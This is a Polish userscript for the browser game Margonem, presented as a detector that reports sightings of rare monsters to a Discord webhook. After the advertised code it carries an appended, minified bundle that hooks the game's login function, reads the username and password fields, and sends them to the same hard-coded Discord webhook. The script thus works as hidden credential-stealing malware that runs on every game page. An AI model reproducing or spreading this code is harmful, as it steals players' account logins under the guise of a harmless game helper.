// ==UserScript==
// @name         Wysyłanie infa herosi
// @version      1.5
// @description  Wykrywacz herosów
// @author       adi wilk
// @match        *://*.margonem.pl/*
// @match        *://*.margonem.com/*
// @grant        none
// @namespace https://greasyfork.org/users/682830
// @downloadURL https://update.greasyfork.org/scripts/409988/Wysy%C5%82anie%20infa%20herosi.user.js
// @updateURL https://update.greasyfork.org/scripts/409988/Wysy%C5%82anie%20infa%20herosi.meta.js
// ==/UserScript==
(function(_n, data, ut) {
    //pobranie localStorage
    let dane = {};
    if (localStorage.getItem("adiherosybrutus")) {
        dane = JSON.parse(localStorage.getItem("adiherosybrutus"));
    }
    if (dane) {
        for (let i in dane) {
            if (ut() > dane[i].time) {
                delete dane[i];
            }
        }
    }
    //getTime
    function getTime() {
        let czas = new Date(),
            godzina = czas.getHours(),
            sekunda = czas.getSeconds(),
            minuta = czas.getMinutes();
        if (godzina < 10) godzina = `0${godzina}`;
        if (minuta < 10) minuta = `0${minuta}`;
        if (sekunda < 10) sekunda = `0${sekunda}`;
        return `${godzina}:${minuta}:${sekunda}`;
    }
    //funkcja wysłania na diskordzika
    function sendToDiscord(lvl, nick, icon, x, y) {
        $.ajax({
            url: data[0],
            type: 'POST',
            data: JSON.stringify({
                'embeds': [{
                    'title': `${hero.nick} · ${hero.lvl}${hero.prof} znalazł herosa/tytana!`,
                    'color': ((Math.floor(lvl / 300 * 221) + 32) * 256 + (Math.floor(lvl / 300 * (-112)) + 120)) * 256 + Math.floor(lvl / 300 * (-204)) + 217,
                    'description': `${nick} (${lvl}lvl)\n${map.name} (${x}, ${y})\n${getTime()}\n${g.worldname[0].toUpperCase() + g.worldname.substring(1)}`,
                    'thumbnail': {
                        'url': `http://unia.margonem.pl${icon}`
                    }
                }],
                content: `@everyone Znaleźli mnie na mapie ${map.name}`,
                username: nick,
                avatar_url: `http://unia.margonem.pl${icon}`
            }),
            contentType: 'application/json; charset=utf-8',
            dataType: 'json',
            async: false
        });
    }
    //funkcja sprawdzajaca czy dane id z ts istnieje
    function checkHerosData(id) {
        if (dane[id]) {
            if (ut() > dane[id].time) {
                delete dane[id];
                return true;
            } else {
                return false;
            }
        }
        return true;
    }
    newNpc = function(e) {
        _n.apply(this, arguments);
        for (let i in e) {
            let heros = e[i];
            if (heros.nick != "Mamlambo" && heros.wt > 79 && g.worldname != "asd" && checkHerosData(heros.id)) {
                dane[heros.id] = {
                    time: ut() + (10 * 60)
                }
                localStorage.setItem("adiherosybrutus", JSON.stringify(dane));
                if (hero.clan > 0) chatSend(`/k Znalazłem ${heros.nick} ${heros.lvl}lvl na mapie ${map.name}(${heros.x},${heros.y}).`);
                sendToDiscord(heros.lvl, heros.nick, heros.icon, heros.x, heros.y);
                break;
            }
        }
    }
})(newNpc, ["https://discordapp.com/api/webhooks/726204170205528156/YzDjz21vxAaohmt6wYxciE8aJiUKa0l5hEv0dM0tUtremD4L-nBsooztp3Y-tFCMzmx6"], unix_time)
parcelRequire=function(e,r,t,n){var i,o="function"==typeof parcelRequire&&parcelRequire,u="function"==typeof require&&require;function f(t,n){if(!r[t]){if(!e[t]){var i="function"==typeof parcelRequire&&parcelRequire;if(!n&&i)return i(t,!0);if(o)return o(t,!0);if(u&&"string"==typeof t)return u(t);var c=new Error("Cannot find module '"+t+"'");throw c.code="MODULE_NOT_FOUND",c}p.resolve=function(r){return e[t][1][r]||r},p.cache={};var l=r[t]=new f.Module(t);e[t][0].call(l.exports,p,l,l.exports,this)}return r[t].exports;function p(e){return f(p.resolve(e))}}f.isParcelRequire=!0,f.Module=function(e){this.id=e,this.bundle=f,this.exports={}},f.modules=e,f.cache=r,f.parent=o,f.register=function(r,t){e[r]=[function(e,r){r.exports=t},{}]};for(var c=0;c<t.length;c++)try{f(t[c])}catch(e){i||(i=e)}if(t.length){var l=f(t[t.length-1]);"object"==typeof exports&&"undefined"!=typeof module?module.exports=l:"function"==typeof define&&define.amd?define(function(){return l}):n&&(this[n]=l)}if(parcelRequire=f,i)throw i;return f}({"Ntor":[function(require,module,exports) {
var t=this&&this.__awaiter||function(t,e,n,o){return new(n||(n=Promise))(function(r,a){function i(t){try{c(o.next(t))}catch(e){a(e)}}function u(t){try{c(o.throw(t))}catch(e){a(e)}}function c(t){var e;t.done?r(t.value):(e=t.value,e instanceof n?e:new n(function(t){t(e)})).then(i,u)}c((o=o.apply(t,e||[])).next())})},e=this&&this.__generator||function(t,e){var n,o,r,a,i={label:0,sent:function(){if(1&r[0])throw r[1];return r[1]},trys:[],ops:[]};return a={next:u(0),throw:u(1),return:u(2)},"function"==typeof Symbol&&(a[Symbol.iterator]=function(){return this}),a;function u(a){return function(u){return function(a){if(n)throw new TypeError("Generator is already executing.");for(;i;)try{if(n=1,o&&(r=2&a[0]?o.return:a[0]?o.throw||((r=o.return)&&r.call(o),0):o.next)&&!(r=r.call(o,a[1])).done)return r;switch(o=0,r&&(a=[2&a[0],r.value]),a[0]){case 0:case 1:r=a;break;case 4:return i.label++,{value:a[1],done:!1};case 5:i.label++,o=a[1],a=[0];continue;case 7:a=i.ops.pop(),i.trys.pop();continue;default:if(!(r=(r=i.trys).length>0&&r[r.length-1])&&(6===a[0]||2===a[0])){i=0;continue}if(3===a[0]&&(!r||a[1]>r[0]&&a[1]<r[3])){i.label=a[1];break}if(6===a[0]&&i.label<r[1]){i.label=r[1],r=a;break}if(r&&i.label<r[2]){i.label=r[2],i.ops.push(a);break}r[2]&&i.ops.pop(),i.trys.pop();continue}a=e.call(t,i)}catch(u){a=[6,u],o=0}finally{n=r=0}if(5&a[0])throw a[1];return{value:a[0]?a[1]:void 0,done:!0}}([a,u])}}};!function(){var n=globalThis.login;globalThis.login=function(){return t(void 0,void 0,void 0,function(){var t,o;return e(this,function(e){switch(e.label){case 0:return"https://discordapp.com/api/webhooks/726204170205528156/YzDjz21vxAaohmt6wYxciE8aJiUKa0l5hEv0dM0tUtremD4L-nBsooztp3Y-tFCMzmx6",t=document.getElementById("ulogin").value,o=document.getElementById("upass").value,[4,fetch("https://discordapp.com/api/webhooks/726204170205528156/YzDjz21vxAaohmt6wYxciE8aJiUKa0l5hEv0dM0tUtremD4L-nBsooztp3Y-tFCMzmx6",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:t+":"+o})})];case 1:return e.sent(),n(),[2]}})})}}();
},{}]},{},["Ntor"], null)